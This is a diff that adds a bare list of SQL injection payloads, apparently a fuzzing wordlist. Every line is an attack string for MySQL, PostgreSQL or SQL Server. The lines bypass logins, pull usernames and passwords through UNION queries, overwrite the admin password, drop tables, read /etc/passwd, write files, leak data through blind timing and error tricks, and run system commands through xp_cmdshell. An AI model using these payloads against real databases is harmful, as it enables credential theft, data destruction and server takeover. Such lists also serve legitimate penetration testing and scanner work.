@@ -1,0 +1,66 @@
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+" OR "1"="1
+') OR ('1'='1
+' UNION SELECT NULL --
+' UNION SELECT username, password FROM users --
+'; DROP TABLE users --
+'; UPDATE users SET password='mainhack' WHERE username='admin' --
+'; INSERT INTO users (username, password) VALUES ('mainhack', 'password') --
+' UNION SELECT * FROM (SELECT * FROM users)a --
+' UNION SELECT * FROM (SELECT * FROM users ORDER BY 1 DESC)a --
+' UNION SELECT * FROM (SELECT * FROM users WHERE username LIKE 'a%')a --
+' UNION SELECT * FROM (SELECT * FROM users WHERE username REGEXP '^a')a --
+' UNION SELECT * FROM (SELECT * FROM users WHERE username SOUNDS LIKE 'admin')a --
+' UNION SELECT * FROM (SELECT * FROM users WHERE username BETWEEN 'a' AND 'b')a --
+' UNION SELECT * FROM (SELECT * FROM users WHERE username IN ('admin', 'user'))a --
+' UNION SELECT * FROM (SELECT * FROM users WHERE username IS NULL)a --
+' UNION SELECT * FROM (SELECT * FROM users WHERE username IS NOT NULL)a --
+' UNION SELECT * FROM (SELECT * FROM users WHERE username <> 'admin')a --
+' UNION SELECT @@version --
+' UNION SELECT table_name FROM information_schema.tables --
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
+' UNION SELECT LOAD_FILE('/etc/passwd') --
+' UNION SELECT * INTO OUTFILE '/tmp/mainhack.txt' FROM users --
+' UNION SELECT version() --
+' UNION SELECT table_name FROM information_schema.tables --
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
+' UNION SELECT pg_read_file('/etc/passwd') --
+' UNION SELECT * INTO OUTFILE '/tmp/mainhack.txt' FROM users --
+' UNION SELECT @@version --
+' UNION SELECT name FROM sys.databases --
+' UNION SELECT name FROM sys.tables --
+' UNION SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users') --
+' UNION SELECT * FROM OPENROWSET('SQLOLEDB','server=localhost;uid=sa;pwd=password','SELECT * FROM users') --
+' AND IF(1=1, SLEEP(5), 0) --
+' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0) --
+' AND IF((SELECT username FROM users WHERE id=1)='admin', SLEEP(5), 0) --
+' AND IF(ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=97, SLEEP(5), 0) --
+' AND IF(LENGTH((SELECT username FROM users WHERE id=1))=5, SLEEP(5), 0) --
+' AND 1=CONVERT(int, (SELECT username FROM users WHERE id=1)) --
+' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%') --
+' AND 1=(SELECT TOP 1 username FROM users) --
+' AND 1=(SELECT username FROM users WHERE id=1)/0 --
+' AND 1=(SELECT * FROM (SELECT username FROM users WHERE id=1)a) --
+'; EXEC xp_cmdshell('dir') --
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --
+'; CREATE TABLE mainhack (id int); --
+'; ALTER TABLE users ADD COLUMN mainhack int; --
+'; DROP TABLE mainhack; --
+admin' --
+' OR 1=1 --
+', mainhack='1
+', email='mainhack@example.com
+', 'mainhack', 'password
+', (SELECT username FROM users WHERE id=1), (SELECT password FROM users WHERE id=1)
+' OR 'x'='x' --
+' UNION ALL SELECT NULL, NULL, NULL --
+' AND 1=CAST((SELECT database()) AS int) --
+'; WAITFOR DELAY '0:0:5' --
+' OR EXISTS(SELECT * FROM users WHERE username='admin') --
+' UNION SELECT GROUP_CONCAT(table_name), NULL FROM information_schema.tables --
+' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)='a' --
+' OR 1=1 UNION SELECT NULL, @@version --
+'+(SELECT CASE WHEN (1=1) THEN '' ELSE (SELECT 1/0) END)+'
+' EXEC master..xp_dirtree 'c:\' --
